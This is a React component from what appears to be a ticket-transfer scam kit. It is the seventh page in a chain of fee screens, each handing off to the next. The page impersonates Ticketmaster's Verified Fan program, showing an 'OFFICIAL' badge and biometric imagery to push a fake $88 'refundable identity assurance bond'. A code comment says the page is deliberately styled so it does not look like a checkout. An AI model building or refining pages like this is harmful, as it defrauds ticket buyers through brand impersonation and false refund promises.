import { useState } from 'react'
import {
  IoArrowBack,
  IoShieldCheckmarkOutline,
  IoFingerPrint,
  IoLockClosedOutline,
  IoEyeOutline,
  IoFlashOffOutline,
  IoPersonCircleOutline,
  IoCheckmarkCircle,
  IoWalletOutline,
} from 'react-icons/io5'
import { MdOutlineConfirmationNumber } from 'react-icons/md'
import { useLocation, useNavigate } from 'react-router-dom'
import ConfirmAlert from '../components/ConfirmAlert'
import BondLoader from '../components/BondLoader'
import './SeventhFee.css'

// ── Verified Fan™ Identity Assurance Bond (Fee #7) ──────────────────────────
// Reached from /sixthfee, hands off to /eighthfee. Direction: TICKETMASTER's
// own anti-bot program. A refundable $88 bond confirms a real human — not an
// automated reseller bot — is moving the tickets; it's released once the
// recipient's identity check passes. Presented as a dark blue-glass biometric
// verification surface (deliberately NOT a checkout screen).
const BOND_AMOUNT = 88
const PROGRAM = 'Verified Fan™ Program'

const SeventhFee = () => {
  const { state } = useLocation()
  const navigate = useNavigate()
  const [phase, setPhase] = useState('idle') // idle -> loading
  const [confirmOpen, setConfirmOpen] = useState(false)

  const event = state?.event || null
  const tickets = (state?.tickets && state.tickets.length) ? state.tickets : (event?.tickets || [])
  const recipient = state?.recipient || {}
  const ticketCount = tickets.length || 1

  // Reached directly / no transfer in flight
  if (!event) {
    return (
      <div className="vfb-page vfb-page--empty">
        <div className="vfb-empty-inner">
          <MdOutlineConfirmationNumber size={40} color="#2F8BFF" />
          <p className="vfb-empty-title">No Verification Pending</p>
          <p className="vfb-empty-sub">
            Start a ticket transfer to complete Verified Fan identity assurance here.
          </p>
          <button className="vfb-empty-btn" onClick={() => navigate('/')}>Back To My Events</button>
        </div>
      </div>
    )
  }

  // Biometric verification loader → hand off unchanged to the next fee
  if (phase === 'loading') {
    return (
      <BondLoader
        duration={2200}
        onDone={() => navigate('/eighthfee', { state: { event, tickets, recipient } })}
      />
    )
  }

  const recipientName = [recipient.firstName, recipient.lastName].filter(Boolean).join(' ')
  const recipientContact = recipient.email || recipient.phone || ''
  const amountLabel = `$${BOND_AMOUNT.toFixed(2)}`

  const handleConfirmed = () => {
    setConfirmOpen(false)
    setPhase('loading')
  }

  return (
    <div className="vfb-page">
      {/* ── Header ── */}
      <div className="vfb-header">
        <button className="vfb-back-btn" onClick={() => navigate(-1)}>
          <IoArrowBack size={18} />
        </button>
        <div className="vfb-brand">
          <IoShieldCheckmarkOutline size={15} />
          <span>{PROGRAM}</span>
        </div>
        <span className="vfb-official-badge">
          <IoLockClosedOutline size={11} /> OFFICIAL
        </span>
      </div>

      <div className="vfb-body">
        {/* ── Hero identity card ── */}
        <div className="vfb-id-card">
          <div className="vfb-id-glow" />
          <div className="vfb-shield">
            <IoFingerPrint size={30} />
          </div>
          <p className="vfb-id-eyebrow">Identity Assurance Bond</p>
          <p className="vfb-id-title">Prove you&rsquo;re a real fan, not a bot</p>
          <p className="vfb-id-amount">{amountLabel}</p>
          <span className="vfb-refund-pill">
            <IoWalletOutline size={13} /> Refunded after verification
          </span>
          <p className="vfb-id-note">
            Required by <strong>Ticketmaster&rsquo;s Verified Fan&trade; system</strong> before{' '}
            {ticketCount} ticket{ticketCount !== 1 ? 's' : ''} to {event.name} can move.
          </p>
        </div>

        {/* ── Why the bond ── */}
        <div className="vfb-reason-card">
          <div className="vfb-reason-icon"><IoFlashOffOutline size={17} /></div>
          <div className="vfb-reason-text">
            <p className="vfb-reason-title">Why {amountLabel} is required</p>
            <p className="vfb-reason-body">
              Automated reseller bots move tickets in bulk the instant they clear other checks.
              A refundable identity-assurance bond makes bulk bot transfers uneconomical while
              costing genuine fans nothing: the <strong>{amountLabel}</strong> is returned in full
              the moment {recipientName || 'your recipient'}&rsquo;s identity check passes. It is
              how Verified Fan keeps real seats with real people.
            </p>
          </div>
        </div>

        {/* ── Assurance features ── */}
        <p className="vfb-section-title">What your bond enables</p>
        <div className="vfb-features">
          <div className="vfb-feature">
            <span className="vfb-feature-icon"><IoFingerPrint size={16} /></span>
            <span className="vfb-feature-title">Human check</span>
            <span className="vfb-feature-sub">Confirms a real person initiated this transfer.</span>
          </div>
          <div className="vfb-feature">
            <span className="vfb-feature-icon"><IoFlashOffOutline size={16} /></span>
            <span className="vfb-feature-title">Bot deterrent</span>
            <span className="vfb-feature-sub">Makes automated bulk transfers unprofitable.</span>
          </div>
          <div className="vfb-feature">
            <span className="vfb-feature-icon"><IoEyeOutline size={16} /></span>
            <span className="vfb-feature-title">Identity screen</span>
            <span className="vfb-feature-sub">Recipient is screened before tickets arrive.</span>
          </div>
          <div className="vfb-feature">
            <span className="vfb-feature-icon"><IoWalletOutline size={16} /></span>
            <span className="vfb-feature-title">Full refund</span>
            <span className="vfb-feature-sub">Bond released automatically once cleared.</span>
          </div>
        </div>

        {/* ── Verification flow ── */}
        <p className="vfb-section-title">Verification flow</p>
        <div className="vfb-flow">
          <div className="vfb-step">
            <span className="vfb-step-dot vfb-step-dot--active"><IoLockClosedOutline size={13} /></span>
            <div className="vfb-step-text">
              <p className="vfb-step-title">Bond placed</p>
              <p className="vfb-step-sub">{amountLabel} held by the Verified Fan program — not spent.</p>
            </div>
          </div>
          <div className="vfb-step">
            <span className="vfb-step-dot"><IoFingerPrint size={13} /></span>
            <div className="vfb-step-text">
              <p className="vfb-step-title">Identity signature analyzed</p>
              <p className="vfb-step-sub">Your account&rsquo;s human signals are verified in seconds.</p>
            </div>
          </div>
          <div className="vfb-step">
            <span className="vfb-step-dot"><IoCheckmarkCircle size={13} /></span>
            <div className="vfb-step-text">
              <p className="vfb-step-title">Bond released</p>
              <p className="vfb-step-sub">{amountLabel} returns to your payment method after the check passes.</p>
            </div>
          </div>
        </div>

        {/* ── Verified subject ── */}
        <p className="vfb-section-title">Transfer under verification</p>
        <div className="vfb-recipient-card">
          <div className="vfb-recipient-avatar"><IoPersonCircleOutline size={22} /></div>
          <div className="vfb-recipient-main">
            <p className="vfb-recipient-name">{recipientName || 'Recipient'}</p>
            {recipientContact && <p className="vfb-recipient-contact">{recipientContact}</p>}
          </div>
          <span className="vfb-recipient-tag">Screened</span>
        </div>
      </div>

      {/* ── Footer / CTA ── */}
      <div className="vfb-footer">
        <button className="vfb-cta-btn" onClick={() => setConfirmOpen(true)}>
          <IoFingerPrint size={17} />
          Place {amountLabel} Assurance Bond
        </button>
        <p className="vfb-fineprint">
          Refundable bond, not a payment. <strong>Verified Fan&trade;</strong> releases it once
          your identity check clears.
        </p>
      </div>

      {confirmOpen && (
        <ConfirmAlert
          title="Confirm Assurance Bond"
          message={`Place a refundable ${amountLabel} Verified Fan bond to verify this transfer of ${ticketCount} ticket${ticketCount !== 1 ? 's' : ''}?`}
          confirmLabel={`Place ${amountLabel} Bond`}
          cancelLabel="Cancel"
          onConfirm={handleConfirmed}
          onCancel={() => setConfirmOpen(false)}
        />
      )}
    </div>
  )
}

export default SeventhFee
